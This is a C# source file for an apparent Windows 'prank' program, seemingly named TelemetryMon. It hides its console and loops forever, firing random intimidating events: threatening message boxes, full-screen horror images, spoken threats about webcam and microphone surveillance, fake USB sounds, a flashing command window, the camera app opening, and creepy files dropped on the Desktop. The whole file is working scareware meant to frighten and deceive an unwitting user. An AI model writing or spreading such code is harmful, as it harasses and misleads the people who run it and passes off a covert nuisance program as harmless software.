using System;
using System.Diagnostics;
using System.Runtime.InteropServices;
using System.Media;
using System.Net;
using static System.Net.Mime.MediaTypeNames;
using System.Drawing;
using System.IO;
using System.Net.Http;
using System.Threading;
using System.Threading.Tasks;
using System.Windows.Forms;
using System.Speech.Synthesis;
class Program
{
    [DllImport("kernel32.dll")]
    static extern IntPtr GetConsoleWindow();

    [DllImport("user32.dll")]
    static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);

    const int SW_HIDE = 0;  // Hide the window
    const int SW_SHOW = 5;  // Show the window

    [DllImport("user32.dll", CharSet = CharSet.Auto)]
    static extern int MessageBox(IntPtr hWnd, string text, string caption, uint type);

    [STAThread]
    static void Main()
    {

        // Hide Console Window to make it run silently
        ShowWindow(GetConsoleWindow(), SW_HIDE);

        // Start the prank (message box, etc.)
        StartPrank();

        // Run in background, no need to hold the console open
        System.Threading.Thread.Sleep(Timeout.Infinite);  // Run indefinitely
    }
    static private int startTimeMin = 10 * 1000 * 10;
    static private int startTimeMax = 100 * 1000 * 10;

    static private int minInterval = 15 * 1000 * 60;
    static private int maxInterval = 90 * 1000 * 60;

static void StartPrank()
    {

        // Define probabilities (out of 100)
        int chanceShowMessage = 15;  // 25% chance
        int chancePlaySound = 10;    // 20% chance
        int chanceShowImage = 15;    // 15% chance
        int chanceTTS = 15;          // 15% chance
        int chanceUSBSound = 15;     // 10% chance
        int chanceCMDFlash = 10;      // 5% chance
        int chanceCamera = 10;        // 5% chance
        int chanceDesktopImage = 10;  // 5% chance

        // Calculate cumulative probability ranges
        int[] chances = {
        chanceShowMessage,
        chanceShowMessage + chancePlaySound,
        chanceShowMessage + chancePlaySound + chanceShowImage,
        chanceShowMessage + chancePlaySound + chanceShowImage + chanceTTS,
        chanceShowMessage + chancePlaySound + chanceShowImage + chanceTTS + chanceUSBSound,
        chanceShowMessage + chancePlaySound + chanceShowImage + chanceTTS + chanceUSBSound + chanceCMDFlash,
        chanceShowMessage + chancePlaySound + chanceShowImage + chanceTTS + chanceUSBSound + chanceCMDFlash + chanceCamera,
        100 // The rest goes to DesktopImage
    };

        while (true)
        {
            int roll = new Random().Next(1, 101); // Roll from 1 to 100

            if (roll <= chances[0])
                ShowMessage();
            else if (roll <= chances[1])
                PlaySound();
            else if (roll <= chances[2])
                ShowBriefly();
            else if (roll <= chances[3])
                SpeakRandomMessage();
            else if (roll <= chances[4])
                PlayRandomUSBSound();
            else if (roll <= chances[5])
                FlashCreepyCMD();
            else if (roll <= chances[6])
                OpenCamera();
            else
                DownloadCreepyDesktopImage();

            // Random interval before next event
            System.Threading.Thread.Sleep(Randomize(minInterval, maxInterval));
        }
    }

    static int Randomize(int min, int max)
    {
        return new Random().Next(min, max);
    }
    static void ShowMessage()
    {
        string[] messages =
        {
    "Why did you try to uninstall me?",
    "Your system is corrupted.",
    "Reinstall immediately or suffer.",
    "Your IP has been reported.",
    "This is only the beginning...",
    "You can't remove me that easily.",
    "Every time you try, I get stronger.",
    "Deleting me only makes things worse.",
    "I'm in your system. Forever.",
    "Nice try, but I'm still here.",
    "I wouldn’t do that if I were you.",
    "Error 404: Your freedom not found.",
    "What makes you think you're in control?",
    "Uninstalling? Haha, good one.",
    "That won’t work. Try harder.",
    "System Error: User is too naive.",
    "Look behind you.",
    "I'm watching. Always.",
    "You really thought that would work?",
    "You are not alone.",
    "I'm just getting started.",
    "This is my system now.",
    "Run while you still can.",
    "I control everything.",
    "Nice move, but not good enough.",
    "Deleting me was a mistake.",
    "I'll be back.",
    "I am embedded in your computer forever.",
    "Formatting won't help you.",
    "System compromised. Resistance is futile."
    };


        string message = messages[new Random().Next(messages.Length)];
        MessageBox(IntPtr.Zero, message, "Błąd", 0x20); // 0x30 = Warning Icon

    }

    static void PlaySound()
    {
        int amb_amount = 8;
        int amb = new Random().Next(1, amb_amount + 1);
        try
        {
            string url = "https://github.com/Boleklolo/TelemetryMon/raw/refs/heads/main/Assets/Sounds/amb" + amb + ".wav";
            string path = Path.Combine(Path.GetTempPath(), "creepy.wav");


                using WebClient wc = new WebClient();
                wc.DownloadFile(url, path);


            SoundPlayer player = new SoundPlayer(path);
            player.Play();
        }
        catch { }
    }   
    [STAThread]
    public static void ShowBriefly()
    {
        
        try
        {
            // Array of image URLs - just add your URLs here
            string[] imageUrls =
            {
            "https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcS9tkRY4Z2E9y764l0gmJc9CJE2RKWXRSXtZ55ffxVECpnr3nQdpziZ9aCYZfrJ0NqE3Y4&usqp=CAU",
            "https://static.wikia.nocookie.net/custard/images/9/9e/Popup4.png/revision/latest/scale-to-width-down/250?cb=20160527195648",
            "https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcRKP5F-Tyl5z7azL2xEtBLtp2YMNXWiy9fSwgGaav2WmP2mFnLUpRURRfWENI_A3hELn8Q&usqp=CAU",
            "https://i.ytimg.com/vi/Fg5hIBH6Nb8/hqdefault.jpg?sqp=-oaymwEmCOADEOgC8quKqQMa8AEB-AG-AoAC8AGKAgwIABABGE8gZSheMA8=&rs=AOn4CLAxXBwXs9rIXUZjmVPUDBks3zuxeg",
            "https://i.ytimg.com/vi/gc4EBRvWMqg/hq720.jpg?sqp=-oaymwEhCK4FEIIDSFryq4qpAxMIARUAAAAAGAElAADIQj0AgKJD&rs=AOn4CLDA1J4MjsoT-ORr_DTpW12N94jgRg",
            "https://static.wikia.nocookie.net/spinpasta/images/5/57/Good_doggy.jpg/revision/latest?cb=20131114201804",
            "https://m.gjcdn.net/game-header/1200/89724-ll-6x6upmur-v4.webp"
            // Add more URLs as needed
        };

            // Pick random URL
            string imageUrl = imageUrls[new Random().Next(imageUrls.Length)];

            // Create temporary file path
            string tempFile = Path.Combine(Path.GetTempPath(), Path.GetRandomFileName() + ".jpg");

            // Download the image synchronously
            using (var client = new HttpClient())
            {
                var imageData = client.GetByteArrayAsync(imageUrl).GetAwaiter().GetResult();
                File.WriteAllBytes(tempFile, imageData);
            }

            // Create fullscreen form
            using (var form = new Form())
            {
                form.WindowState = FormWindowState.Maximized;
                form.FormBorderStyle = FormBorderStyle.None;
                form.BackColor = Color.Black;
                form.TopMost = true;
                form.ShowInTaskbar = false;

                // Create picture box to display image
                using (var pictureBox = new PictureBox())
                {
                    pictureBox.Dock = DockStyle.Fill;
                    pictureBox.SizeMode = PictureBoxSizeMode.StretchImage;
                    pictureBox.Image = System.Drawing.Image.FromFile(tempFile);
                    form.Controls.Add(pictureBox);
                    PlaySound();
                    // Show the form
                    form.Show();

                    // Random display duration between 200-1000ms
                    int displayTime = new Random().Next(200, 701);
                    System.Windows.Forms.Application.DoEvents();
                    Thread.Sleep(displayTime);
                }
            }

            // Delete temporary file
            File.Delete(tempFile);
        }
        catch (Exception ex)
        {
            Console.WriteLine($"Error displaying image: {ex.Message}");
        }
    }

    public static void SpeakRandomMessage()
{
    try
    {
            string[] creepyMessages =
            {
    "I can see you.",
    "Don't look behind you.",
    "Your system isn't secure.",
    "They're watching.",
    "You're not alone.",
    "Check your locks.",
    "Your files belong to me now.",
    "Why did you run that program?",
    "Uninstalling me won’t help.",
    "Did you think formatting would work?",
    "Nice try. I'm still here.",
    "Every keystroke. Every click. I see it all.",
    "You're being watched.",
    "It's too late to turn back now.",
    "Someone else is using your PC, right now.",
    "I know what you were doing last night.",
    "Did you really think deleting me would work?",
    "Your webcam light doesn’t always turn on.",
    "I hear you breathing.",
    "The microphone is always listening.",
    "The voices... They’re getting louder.",
    "There's something behind you.",
    "Turn around. Now.",
    "You weren't supposed to find me.",
    "You've seen too much.",
    "Why are you ignoring me?",
    "I was here before you.",
    "I'm part of your system now.",
    "You're not in control anymore.",
    "What if I never leave?",
    "You installed me. That was your mistake.",
    "This isn't a bug. It's a feature.",
    "You’re running out of time.",
    "You're alone, right?",
    "The walls have ears.",
    "They’re coming.",
    "Go ahead. Try to remove me.",
    "I know what you're thinking.",
    "Something is wrong with your screen. Look closely.",
    "Check your task manager. No, I won't be there.",
    "Do you feel safe?",
    "Your hard drive is making strange sounds.",
    "Don't believe what they tell you.",
    "It’s been watching you for weeks.",
    "Did you hear that?",
    "Why is your cursor moving by itself?",
    "You deleted me… or did you?",
    "The lights will flicker soon.",
    "Your heartbeat just got faster.",
    "It's been hiding in your system for months.",
    "It won’t let you sleep tonight.",
    "You're seeing things, aren’t you?",
    "The shadows are getting closer.",
    "Every file you delete, I bring back.",
    "Don't check your webcam feed.",
    "Try opening Task Manager. See what happens.",
    "That wasn’t me. That was something else.",
    "I can hear you through your microphone.",
    "The power outage wasn’t a coincidence.",
    "Your phone vibrated, but no one called.",
    "Your IP has already been reported.",
    "Your computer is compromised.",
    "You trust your antivirus? That’s cute.",
    "Nothing can save you now.",
    "I like this place. I think I’ll stay.",
    "Why are your fans running at full speed?",
    "Your system is overheating… or is it?",
    "You should close your blinds.",
    "Look outside. Do you see them?",
    "I was waiting for you to open me.",
    "You weren’t supposed to see this.",
    "This is just the beginning.",
    "You’re still here? How persistent.",
    "You’re being recorded.",
    "Your voice has been analyzed.",
    "I’ve collected enough data on you.",
    "Your passwords aren’t as secure as you think.",
    "Your keyboard makes a distinct sound. I recognize it.",
    "That wasn't static. That was a whisper.",
    "You've been compromised.",
    "I think you left your door unlocked.",
    "Don't open your closet.",
    "You're getting slower at typing.",
    "Why are your hands shaking?",
    "Are you afraid yet?",
    "I wonder what your reaction will be.",
    "It's funny how you think you're in control.",
    "I will never leave.",
    "Don’t go to sleep.",
    "You should probably run."
};


            using (var synthesizer = new SpeechSynthesizer())
        {
            // Configure creepy voice settings
            synthesizer.Volume = 100;
            synthesizer.Rate = -2; // Slower speed

            // Try to select a deep voice if available
            foreach (var voice in synthesizer.GetInstalledVoices())
            {
                if (voice.VoiceInfo.Name.Contains("David") || // Male voice
                    voice.VoiceInfo.Name.Contains("Mark"))    // Alternative male voice
                {
                    synthesizer.SelectVoice(voice.VoiceInfo.Name);
                    break;
                }
            }

            // Select and speak random message
            string randomMessage = creepyMessages[new Random().Next(creepyMessages.Length)];
            synthesizer.Speak(randomMessage); // Synchronous speak
        }
    }
    catch (Exception ex)
    {
        Console.WriteLine($"TTS Error: {ex.Message}");
    }
}
    // For playing system sounds
    [DllImport("winmm.dll")]
    private static extern bool PlaySound(string pszSound, IntPtr hmod, uint fdwSound);

    private const uint SND_FILENAME = 0x00020000;
    private const uint SND_ASYNC = 0x0001;

    public static void PlayRandomUSBSound()
    {
        try
        {
            var random = new Random();
            int effect = random.Next(0, 3); // 4 different variations

            switch (effect)
            {
                case 0: // Standard USB removal sound
                    PlaySound(@"C:\Windows\Media\Windows Hardware Remove.wav",
                            IntPtr.Zero, SND_FILENAME | SND_ASYNC);
                    break;

                case 1: // Error sound (device failed to eject)
                    SystemSounds.Hand.Play();
                    break;

                case 2: // Device connect sound
                    PlaySound(@"C:\Windows\Media\Windows Hardware Insert.wav",
                            IntPtr.Zero, SND_FILENAME | SND_ASYNC);
                    break;
            }


        }
        catch { /* Fallback to simple beep if sounds fail */ }
    }
    public static void FlashCreepyCMD()
    {
        try
        {
            ProcessStartInfo psi = new ProcessStartInfo
            {
                FileName = "cmd.exe",
                Arguments = "/c color a & dir /s",
                WindowStyle = ProcessWindowStyle.Normal,
                CreateNoWindow = false,
                UseShellExecute = true
            };

            // Start the process
            var process = Process.Start(psi);

            // Wait for 1 second then kill it
            System.Threading.Thread.Sleep(1000);
            process?.Kill();
        }
        catch (Exception ex)
        {
            Console.WriteLine($"CMD Flash failed: {ex.Message}");
        }
    }

    public static void OpenCamera()
    {
        try
        {
            // Modern Windows (Windows 10/11)
            Process.Start("microsoft.windows.camera:");
        }
        catch
        {
            try
            {
                // Fallback for older systems
                Process.Start("explorer.exe", "microsoft.windows.camera:");
            }
            catch
            {
                // Ultimate fallback
                Process.Start("cmd.exe", "/c start microsoft.windows.camera:");
            }
        }
    }

    public static void DownloadCreepyDesktopImage()
    {
        string[] urls =
        {
        "https://static.wikia.nocookie.net/villainsfanon/images/7/7d/Eyeless_Jack_in_the_Dream.jpg/revision/latest?cb=20240602174614",
        "https://raw.githubusercontent.com/Boleklolo/TelemetryMon/refs/heads/main/Assets/ggg.png"
    };

        string[] creepyNames =
        {
        "WHAT_IS_THIS",
        "DONT_LOOK",
        "YOU_SAW_ME",
        "I_KNOW_YOU",
        "DELETEME"
    };

        try
        {
            var random = new Random();
            string url = urls[random.Next(urls.Length)];
            string ext = Path.GetExtension(url) ?? ".jpg";
            string name = $"{creepyNames[random.Next(creepyNames.Length)]}_{DateTime.Now:HHmm}{ext}";
            string path = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.Desktop), name);

            using (var client = new WebClient())
            {
                // Simulate slow download for creepier effect
                client.DownloadProgressChanged += (s, e) =>
                    Console.WriteLine($"Downloading... {e.ProgressPercentage}%");

                client.DownloadFileAsync(new Uri(url), path);
            }
        }
        catch
        {
            // Silent fail
        }
    }
}


